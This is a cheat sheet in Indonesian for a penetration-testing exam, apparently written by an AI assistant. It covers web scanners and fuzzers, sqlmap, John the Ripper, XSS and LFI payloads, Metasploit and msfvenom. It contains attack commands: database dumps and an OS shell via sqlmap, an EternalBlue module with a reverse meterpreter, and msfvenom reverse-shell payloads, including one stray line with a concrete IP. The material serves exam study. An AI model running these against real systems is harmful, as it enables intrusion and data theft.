# Cheat Sheet Ujian Pentest

Berikut adalah cheat sheet ringkas untuk alat-alat pentest yang kamu sebutkan. Untuk **sqlmap, john, XSS, LFI, msfconsole, dan msfvenom**, hasil pencarian yang tersedia tidak memuat perintah spesifik secara mendetail, sehingga saya hanya bisa memberikan gambaran umum dan merujuk pada dokumentasi resmi masing-masing alat.

---

## 1. Nikto

Nikto adalah scanner web server yang mendeteksi 6700+ kerentanan, software usang, misconfig, dan file berbahaya.

**Perintah Dasar:**
```bash
# Scan dasar
nikto -h http://target.com

# Scan HTTPS
nikto -h https://target.com -ssl

# Scan port spesifik
nikto -h target.com -p 8443 -o nikto.txt -Format txt
```

**Flag Penting:**
| Flag | Fungsi |
|------|--------|
| `-h <host>` | Target host/URL |
| `-p <port>` | Port (default 80/443) |
| `-ssl` | Force SSL |
| `-id <user:pass>` | HTTP basic auth |
| `-useproxy <proxy>` | Routing lewat proxy (mis. Burp) |
| `-Tuning <n>` | Scan tuning bitmask |
| `-o <file>` | Output file |
| `-Format <fmt>` | csv/txt/xml/html/json |

**Tuning Values (kombinasi dengan `+`/`-`):**
- `0` File upload
- `1` Interesting files
- `2` Misconfiguration/default files
- `3` Information disclosure
- `4` Injection (XSS/Script)
- `9` SQL injection
- `x` Exclude (contoh: `-Tuning x6` untuk skip DoS)

**Contoh Workflow:**
```bash
# Quick recon
nikto -h http://target.com -Tuning 23b

# Lewat Burp proxy
nikto -h http://target.com -useproxy http://127.0.0.1:8080

# Scan multiple hosts dari file
nikto -h hosts.txt -o results.csv -Format csv
```

---

## 2. Dirsearch

Dirsearch adalah tool brute force direktori dan file untuk aplikasi web, digunakan setelah menemukan service web.

**Perintah Dasar:**
```bash
# Scan sederhana
dirsearch -u http://<IP>

# Spesifikasi wordlist
dirsearch -u http://<IP> -w /usr/share/wordlists/dirb/common.txt

# Spesifikasi ekstensi
dirsearch -u http://<IP> -e php,html,txt

# Ignore kode HTTP tertentu
dirsearch -u http://<IP> -x 403,404

# Filter hanya kode tertentu
dirsearch -u http://<IP> -i 200,301,302
```

**Flag Penting:**
| Flag | Fungsi |
|------|--------|
| `-u` | Target URL |
| `-w` | Wordlist |
| `-e` | Ekstensi (php,html,txt,bak,zip) |
| `-x` | Exclude status codes |
| `-i` | Include status codes |
| `-t` | Jumlah threads |
| `-r` | Scan rekursif |
| `--output` | Export hasil |
| `--random-agent` | Random User-Agent |
| `-U` | Basic auth (user:pass) |

**Workflow CTF/TryHackMe:**
```
RustScan → Nmap → Port 80 → Dirsearch → Enumerasi web
```

**Contoh Praktis:**
```bash
dirsearch -u http://10.10.10.10 -e php,txt,html -t 50
```

---

## 3. ffuf

ffuf (Fuzz Faster U Fool) adalah web fuzzer cepat untuk directory discovery, parameter fuzzing, dan virtual host enumeration.

**Perintah Dasar:**
```bash
# Directory discovery
ffuf -w wordlist.txt -u http://example.com/FUZZ

# File discovery dengan ekstensi
ffuf -w wordlist.txt -u http://example.com/FUZZ -e .aspx,.php,.txt,.html

# Filter status code
ffuf -w wordlist.txt -u http://example.com/FUZZ -mc 200,301
```

**Fuzzing Lanjutan:**
```bash
# Extension fuzzing
ffuf -w /usr/share/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/known_directory/indexFUZZ

# Page fuzzing (known .php)
ffuf -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/known_directory/FUZZ.php

# Recursive fuzzing
ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v

# Sub-domain fuzzing
ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://FUZZ.inlanefreight.com/

# Vhost fuzzing
ffuf -w wordlist.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb'

# Parameter GET fuzzing
ffuf -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx

# Parameter POST fuzzing
ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
```

**Filtering Options:**
| Flag | Fungsi |
|------|--------|
| `-fc` | Filter HTTP status codes |
| `-fl` | Filter jumlah lines |
| `-fr` | Filter regexp |
| `-fs` | Filter response size |
| `-fw` | Filter jumlah words |

**Output & Performance:**
```bash
# Output ke JSON
ffuf -u URL/FUZZ -w wordlist.txt -o results.json -of json

# Rate limiting
ffuf -u URL/FUZZ -w wordlist.txt -rate 100

# Threads
ffuf -w wordlist.txt -u http://example.com/FUZZ -t 64
```

---

## 4. Sqlmap

**Catatan:** Hasil pencarian tidak memuat perintah sqlmap secara spesifik. Berikut adalah perintah umum yang perlu kamu ketahui (dari pengetahuan dasar):

```bash
# Deteksi dasar
sqlmap -u "http://target.com/page.php?id=1"

# POST request
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test"

# Enumerate databases
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Dump table
sqlmap -u "http://target.com/page.php?id=1" -D dbname -T tablename --dump

# OS Shell
sqlmap -u "http://target.com/page.php?id=1" --os-shell
```

**Rekomendasi:** Konsultasikan dokumentasi resmi sqlmap untuk flag lengkap.

---

## 5. John the Ripper

**Catatan:** Hasil pencarian tidak memuat perintah john secara spesifik. Berikut perintah umum:

```bash
# Crack password file
john password.txt

# Dengan wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Show cracked
john --show hashes.txt

# Format spesifik
john --format=NT hashes.txt
```

**Rekomendasi:** Lihat dokumentasi resmi John the Ripper untuk format dan mode cracking yang lebih lengkap.

---

## 6. XSS (Cross-Site Scripting)

**Catatan:** Hasil pencarian hanya menyebut XSS payload patterns + filter bypass variations secara umum.

**Payload Umum:**
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
"><script>alert('XSS')</script>
```

**Rekomendasi:** Gunakan tools seperti XSStrike (disebutkan dalam cheat sheet cybersec) untuk deteksi otomatis.

---

## 7. LFI (Local File Inclusion)

**Catatan:** Hasil pencarian hanya menyebut LFI payloads (incl. php://filter bypasses) secara umum.

**Payload Umum:**
```
../../../../etc/passwd
php://filter/convert.base64-encode/resource=index.php
....//....//....//etc/passwd
```

**Rekomendasi:** Konsultasikan PayloadsAllTheThings untuk LFI payload lengkap.

---

## 8. Msfconsole (Metasploit)

**Catatan:** Hasil pencarian tidak memuat perintah msfconsole secara spesifik. Berikut perintah umum:

```bash
# Jalankan
msfconsole

# Search module
search exploit/windows/smb

# Use module
use exploit/windows/smb/ms17_010_eternalblue

# Set options
set RHOSTS target_ip
set LHOST your_ip
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Run
exploit
```

**Rekomendasi:** Lihat dokumentasi resmi Metasploit untuk module dan opsi lengkap.

---

## 9. Msfvenom


msfvenom -p php/reverse_php LHOST=192.168.58.108 LPORT=4444 -f raw -o shell2.php


**Catatan:** Hasil pencarian tidak memuat perintah msfvenom secara spesifik. Berikut perintah umum:

```bash
# Windows executable
msfvenom -p windows/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 -f exe -o shell.exe

# Linux executable
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 -f elf -o shell.elf

# PHP payload
msfvenom -p php/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 -f raw -o shell.php

# List payloads
msfvenom -l payloads
```

**Rekomendasi:** Lihat dokumentasi resmi msfvenom untuk encoding dan format output lengkap.

---

## Catatan Penting untuk Ujian

1. **Selalu update database tools** sebelum ujian (nikto `-update`, msfconsole `db_status`)
2. **Gunakan proxy** (Burp Suite) untuk capture traffic saat scanning
3. **Kombinasikan tools**: Nmap → Nikto/Dirsearch/ffuf → sqlmap/XSS/LFI
4. **Untuk tools yang tidak lengkap di cheat sheet ini**, buka `man <tool>` atau `<tool> --help` saat ujian

Semoga sukses ujiannya!
